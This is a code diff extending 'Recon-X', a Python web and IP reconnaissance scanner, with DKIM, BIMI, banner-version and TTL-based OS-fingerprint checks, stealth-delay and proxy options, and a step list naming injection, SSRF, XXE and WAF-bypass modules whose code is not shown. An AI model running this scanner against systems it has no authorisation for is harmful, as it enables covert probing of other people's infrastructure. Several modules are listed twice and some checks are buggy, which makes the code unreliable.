+        qname = f"{sel}._domainkey.{domain}"
+        try:
+            answers = resolver.resolve(qname, "TXT")
+            for r in answers:
+                txt = str(r).strip('"')
+                if "v=dkim1" in txt.lower() or "p=" in txt:
+                    found.append({"selector": sel, "record": txt[:200]})
+        except Exception:
+            pass
+    return {"selectors": found, "checked": len(selectors)}
+
+# ================= BIMI RECORD DEEP PARSING =================
+def parse_bimi(record):
+    """Parse BIMI record into components."""
+    if not record:
+        return None
+    parts = {}
+    for item in record.split(";"):
+        item = item.strip()
+        if "=" in item:
+            k, v = item.split("=", 1)
+            parts[k.strip().lower()] = v.strip()
+    return {
+        "version": parts.get("v"),
+        "logo": parts.get("l"),
+        "certificate": parts.get("a"),
+        "raw": record,
+    }
+
+# ================= SERVICE VERSION DETECTION =================
+def detect_service_versions(banners):
+    """Extract version numbers from service banners."""
+    versions = []
+    for port, banner in (banners or {}).items():
+        if not banner or banner.startswith("error"):
+            continue
+        # SSH
+        m = re.search(r"SSH-(\d+\.\d+)-(\S+)", banner)
+        if m:
+            versions.append({"port": port, "service": "SSH", "version": m.group(2), "protocol": m.group(1)})
+        # FTP
+        m = re.search(r"220[- ](.+)", banner)
+        if m and "ftp" in m.group(1).lower():
+            versions.append({"port": port, "service": "FTP", "banner": m.group(1)[:80]})
+        # SMTP
+        m = re.search(r"220[- ](.+)", banner)
+        if m and "smtp" in m.group(1).lower() or "esmtp" in m.group(1).lower():
+            versions.append({"port": port, "service": "SMTP", "banner": m.group(1)[:80]})
+        # HTTP Server header
+        m = re.search(r"Server:\s*(.+)", banner, re.I)
+        if m:
+            versions.append({"port": port, "service": "HTTP", "server": m.group(1).strip()[:80]})
+        # MySQL
+        m = re.search(r"(\d+\.\d+\.\d+)", banner)
+        if m and "mysql" in banner.lower():
+            versions.append({"port": port, "service": "MySQL", "version": m.group(1)})
+        # Redis
+        if "redis" in banner.lower() or "+PONG" in banner:
+            versions.append({"port": port, "service": "Redis", "banner": banner[:60]})
+        # PostgreSQL
+        if "postgres" in banner.lower() or banner.startswith("S") or banner.startswith("N"):
+            if "postgres" in banner.lower():
+                versions.append({"port": port, "service": "PostgreSQL", "banner": banner[:60]})
+    return versions
+
+# ================= OS FINGERPRINTING (TTL-based) =================
+def os_fingerprint(host, timeout=5):
+    """Live: basic OS fingerprinting via TTL and TCP window size."""
+    out = {"os_guess": "Unknown", "ttl": None, "details": ""}
+    try:
+        # Use ping-like approach via subprocess if available
+        pass
+        # Fallback: use ping command
+        import subprocess
+        if shutil.which("ping"):
+            try:
+                proc = subprocess.run(["ping", "-n", "1", "-w", "2000", host],
+                                      capture_output=True, timeout=5, text=True)
+                output = proc.stdout + proc.stderr
+                # Windows ping shows TTL
+                m = re.search(r"TTL=(\d+)", output, re.I)
+                if m:
+                    ttl = int(m.group(1))
+                    out["ttl"] = ttl
+                    if ttl <= 64:
+                        out["os_guess"] = "Linux/Unix (TTL<=64)"
+                    elif ttl <= 128:
+                        out["os_guess"] = "Windows (TTL<=128)"
+                    elif ttl <= 255:
+                        out["os_guess"] = "Network device/Solaris (TTL<=255)"
+                    out["details"] = f"TTL={ttl}"
+            except Exception as e:
+                out["details"] = str(e)
+    except Exception as e:
+        out["details"] = str(e)
+    return out
+
+# ================= RUNNERS =================
+
+def run_http3(ctx, url, args):
+    p_section("HTTP/3 (QUIC) Detection", "80")
+    ctx["modules_run"].append("http3")
+    res = detect_http3(url, timeout=args.timeout)
+    ctx["http3"] = res
+    if res["supported"]:
+        p_ok("HTTP/3", f"supported - {res['details']}")
+    else:
+        p_note("HTTP/3", res["details"])
+
+def run_dkim(ctx, host, args):
+    p_section("DKIM Record Lookup", "81")
+    ctx["modules_run"].append("dkim")
+    if is_ip(host):
+        p_note("DKIM", "not measured - target is an IP")
+        ctx["dkim"] = None
+        return
+    res = lookup_dkim(host, timeout=args.timeout)
+    ctx["dkim"] = res
+    if res["selectors"]:
+        p_ok("DKIM selectors", len(res["selectors"]))
+        for s in res["selectors"]:
+            p_ok(f"  {s['selector']}", shorten(s["record"], 80))
+    else:
+        p_warn("DKIM", f"no DKIM records found (checked {res['checked']} selectors)")
+
+def run_bimi_deep(ctx, host, args):
+    p_section("BIMI Deep Parsing", "82")
+    ctx["modules_run"].append("bimi_deep")
+    es = ctx.get("email_security")
+    if not es or not es.get("bimi"):
+        p_note("BIMI", "no BIMI record found")
+        ctx["bimi_deep"] = None
+        return
+    parsed = parse_bimi(es["bimi"])
+    ctx["bimi_deep"] = parsed
+    if parsed:
+        if parsed.get("version"):
+            p_ok("Version", parsed["version"])
+        if parsed.get("logo"):
+            p_ok("Logo URL", parsed["logo"])
+        if parsed.get("certificate"):
+            p_ok("Certificate", parsed["certificate"])
+    else:
+        p_note("BIMI", "could not parse record")
+
+def run_service_versions(ctx, url, args):
+    p_section("Service Version Detection", "83")
+    ctx["modules_run"].append("service_versions")
+    banners = ctx.get("banners", {})
+    if not banners:
+        p_note("Service versions", "not measured - no banners grabbed")
+        ctx["service_versions"] = []
+        return
+    res = detect_service_versions(banners)
+    ctx["service_versions"] = res
+    if res:
+        for r in res:
+            if "version" in r:
+                p_ok(f"{r['service']} (port {r['port']})", r["version"])
+            elif "server" in r:
+                p_ok(f"{r['service']} (port {r['port']})", r["server"])
+            elif "banner" in r:
+                p_ok(f"{r['service']} (port {r['port']})", shorten(r["banner"], 60))
+    else:
+        p_ok("Service versions", "no versions detected in banners")
+
+def run_os_fingerprint(ctx, host, args):
+    p_section("OS Fingerprinting", "84")
+    ctx["modules_run"].append("os_fingerprint")
+    if is_ip(host):
+        res = os_fingerprint(host, timeout=args.timeout)
+    else:
+        # Resolve host first
+        try:
+            ip = socket.gethostbyname(host)
+            res = os_fingerprint(ip, timeout=args.timeout)
+        except Exception as e:
+            res = {"os_guess": "Unknown", "ttl": None, "details": str(e)}
+    ctx["os_fingerprint"] = res
+    p_ok("OS guess", res["os_guess"])
+    if res.get("ttl"):
+        p_ok("TTL", res["ttl"])
+    if res.get("details"):
+        p_note("Details", res["details"])
+
 def main():
-    global QUIET
+    global QUIET, STEALTH_MODE, THROTTLE_DELAY
     parser = argparse.ArgumentParser(
         prog="reconx", description="Recon-X - professional web reconnaissance framework")
     parser.add_argument("target", nargs="?", help="target domain or URL (asked if omitted)")
@@ -4876,11 +6653,24 @@ def main():
     parser.add_argument("--json-only", action="store_true", help="pure JSON on stdout, logs on stderr")
     parser.add_argument("-o", "--output", help="save the JSON report to a file")
     parser.add_argument("--mode", choices=["1", "2"], help="1=website scan, 2=IP scanner (scanner number 2)")
+    parser.add_argument("--stealth", action="store_true", help="enable stealth mode (randomized delays)")
+    parser.add_argument("--delay", type=float, default=0.0, help="delay between requests (seconds)")
+    parser.add_argument("--proxy", help="HTTP/SOCKS proxy URL")
     args = parser.parse_args()
 
     if args.json_only:
         QUIET = True
         args.no_banner = True
+
+    if args.stealth:
+        STEALTH_MODE = True
+    if args.delay and args.delay > 0:
+        THROTTLE_DELAY = args.delay
+    if args.proxy:
+        os.environ["HTTP_PROXY"] = args.proxy
+        os.environ["HTTPS_PROXY"] = args.proxy
+        os.environ["http_proxy"] = args.proxy
+        os.environ["https_proxy"] = args.proxy
 
     if not args.no_banner:
         boot_animation()
@@ -4888,22 +6678,30 @@ def main():
     # ---- mode selection ----
     mode = args.mode
     if not mode and not args.target:
-        # interactive menu
-        sys.stderr.write(c("\n  ============================================\n", C.BOLD + C.G))
-        sys.stderr.write(c("   Recon-X  -  Select Scan Mode\n", C.BOLD + C.G))
-        sys.stderr.write(c("  ============================================\n", C.BOLD + C.G))
-        sys.stderr.write(c("   [1] Website Scan  (full recon of a domain/URL)\n", C.W))
-        sys.stderr.write(c("   [2] IP Scanner (scanner number 2)  (IP -> domains + ports + URLs)\n", C.W))
-        sys.stderr.write(c("  ============================================\n", C.BOLD + C.G))
-        sys.stderr.write(c("   Choice [1/2]: ", C.BOLD + C.W))
+        sys.stderr.buffer.write(c("\n  ============================================\n", C.BOLD + C.G).encode("utf-8"))
+        sys.stderr.buffer.flush()
+        sys.stderr.buffer.write(c("   Recon-X  -  Select Scan Mode\n", C.BOLD + C.G).encode("utf-8"))
+        sys.stderr.buffer.flush()
+        sys.stderr.buffer.write(c("  ============================================\n", C.BOLD + C.G).encode("utf-8"))
+        sys.stderr.buffer.flush()
+        sys.stderr.buffer.write(c("   [1] Website Scan  (full recon of a domain/URL)\n", C.W).encode("utf-8"))
+        sys.stderr.buffer.flush()
+        sys.stderr.buffer.write(c("   [2] IP Scanner (scanner number 2)  (IP -> domains + ports + URLs)\n", C.W).encode("utf-8"))
+        sys.stderr.buffer.flush()
+        sys.stderr.buffer.write(c("  ============================================\n", C.BOLD + C.G).encode("utf-8"))
+        sys.stderr.buffer.flush()
+        sys.stderr.buffer.write(c("   Choice [1/2]: ", C.BOLD + C.W).encode("utf-8"))
+        sys.stderr.buffer.flush()
         sys.stderr.flush()
         try:
             choice = input().strip()
         except (EOFError, KeyboardInterrupt):
-            sys.stderr.write("\naborted\n")
+            sys.stderr.buffer.write(b"\naborted\n")
+            sys.stderr.buffer.flush()
             return 2
         if choice not in ("1", "2"):
-            sys.stderr.write("invalid choice - defaulting to 1\n")
+            sys.stderr.buffer.write(b"invalid choice - defaulting to 1\n")
+            sys.stderr.buffer.flush()
             choice = "1"
         mode = choice
 
@@ -4915,18 +6713,20 @@ def main():
         ip = (args.target or "").strip()
         while not ip:
             try:
-                sys.stderr.write(c("  [ IP ] ", C.BOLD + C.W) + "Enter target IP address: ")
-                sys.stderr.flush()
+                sys.stderr.buffer.write((c("  [ IP ] ", C.BOLD + C.W) + "Enter target IP address: ").encode("utf-8"))
+                sys.stderr.buffer.flush()
                 ip = input().strip()
             except (EOFError, KeyboardInterrupt):
                 sys.stderr.write("\nno IP given\n")
                 return 2
             if not ip:
-                sys.stderr.write("empty - please type an IP address\n")
+                sys.stderr.buffer.write(b"empty - please type an IP address\n")
+            sys.stderr.buffer.flush()
         try:
             ipaddress.ip_address(ip)
         except Exception:
-            sys.stderr.write(f"invalid IP address: {ip}\n")
+            sys.stderr.buffer.write(f"invalid IP address: {ip}\n".encode("utf-8"))
+            sys.stderr.buffer.flush()
             return 2
 
         ctx = run_ip_scan(ip, args)
@@ -4954,14 +6754,17 @@ def main():
     target = (args.target or "").strip()
     while not target:
         try:
-            sys.stderr.write(c("  [ Target ] ", C.BOLD + C.W) + "Enter domain or URL: ")
+            sys.stderr.buffer.write((c("  [ Target ] ", C.BOLD + C.W) + "Enter domain or URL: ").encode("utf-8"))
+            sys.stderr.buffer.flush()
             sys.stderr.flush()
             target = input().strip()
         except (EOFError, KeyboardInterrupt):
-            sys.stderr.write("\nno target given\n")
+            sys.stderr.buffer.write(b"\nno target given\n")
+            sys.stderr.buffer.flush()
             return 2
         if not target:
-            sys.stderr.write("empty - please type a domain or URL\n")
+            sys.stderr.buffer.write(b"empty - please type a domain or URL\n")
+            sys.stderr.buffer.flush()
 
     url = normalize_url(target)
     if not url:
@@ -5021,7 +6824,9 @@ def main():
         ("hpp", lambda: run_hpp(ctx, url, args)),
         ("dnssec", lambda: run_dnssec(ctx, host, args)),
         ("vuln_inventory", lambda: run_vuln_inventory(ctx, args)),
-        ("resource_extractor", lambda: run_resource_extractor(ctx, url, args)),
+        ("http_smuggling", lambda: run_http_smuggling(ctx, url, args)),
+        ("html_report", lambda: run_html_report(ctx, url, args)),
+        ("resume_diff", lambda: run_resume_diff(ctx, args)),
         ("dns_bruteforce", lambda: run_dns_bruteforce(ctx, host, args)),
         ("js_endpoints", lambda: run_js_endpoints(ctx, url, args)),
         ("cloud_buckets", lambda: run_cloud_buckets(ctx, host, args)),
@@ -5036,6 +6841,37 @@ def main():
         ("hidden_fields", lambda: run_hidden_fields(ctx, url, args)),
         ("resource_inventory", lambda: run_resource_inventory(ctx, url, args)),
         ("api_discovery", lambda: run_api_discovery(ctx, url, args)),
+        ("sqli", lambda: run_sqli(ctx, url, args)),
+        ("cmdi", lambda: run_cmdi(ctx, url, args)),
+        ("lfi", lambda: run_lfi(ctx, url, args)),
+        ("crlf", lambda: run_crlf(ctx, url, args)),
+        ("ssrf", lambda: run_ssrf(ctx, url, args)),
+        ("xxe", lambda: run_xxe(ctx, url, args)),
+        ("jwt", lambda: run_jwt(ctx, url, args)),
+        ("host_header_deep", lambda: run_host_header_deep(ctx, url, args)),
+        ("cookie_injection", lambda: run_cookie_injection(ctx, url, args)),
+        ("session_fixation", lambda: run_session_fixation(ctx, url, args)),
+        ("content_type_sniff", lambda: run_content_type_sniff(ctx, url, args)),
+        ("cors_deep2", lambda: run_cors_deep2(ctx, url, args)),
+        ("cloud_metadata", lambda: run_cloud_metadata(ctx, url, args)),
+        ("oauth", lambda: run_oauth(ctx, url, args)),
+        ("s3_deep", lambda: run_s3_deep(ctx, host, args)),
+        ("tech_versions", lambda: run_tech_versions(ctx, url, args)),
+        ("dns_rebinding", lambda: run_dns_rebinding(ctx, host, args)),
+        ("proxy_stealth", lambda: run_proxy_stealth(ctx, args)),
+        ("http3", lambda: run_http3(ctx, url, args)),
+        ("dkim", lambda: run_dkim(ctx, host, args)),
+        ("bimi_deep", lambda: run_bimi_deep(ctx, host, args)),
+        ("service_versions", lambda: run_service_versions(ctx, url, args)),
+        ("os_fingerprint", lambda: run_os_fingerprint(ctx, host, args)),
+        ("smtp_enum", lambda: run_smtp_enum(ctx, host, args)),
+        ("backup_files", lambda: run_backup_files(ctx, url, args)),
+        ("subdomain_permutation", lambda: run_subdomain_permutation(ctx, host, args)),
+        ("waf_bypass", lambda: run_waf_bypass(ctx, url, args)),
+        ("tech_cve", lambda: run_tech_cve(ctx, url, args)),
+        ("html_report", lambda: run_html_report(ctx, url, args)),
+        ("http_smuggling", lambda: run_http_smuggling(ctx, url, args)),
+        ("resume_diff", lambda: run_resume_diff(ctx, args)),
         ("score", lambda: run_score(ctx)),
     ]
     for name, fn in steps:
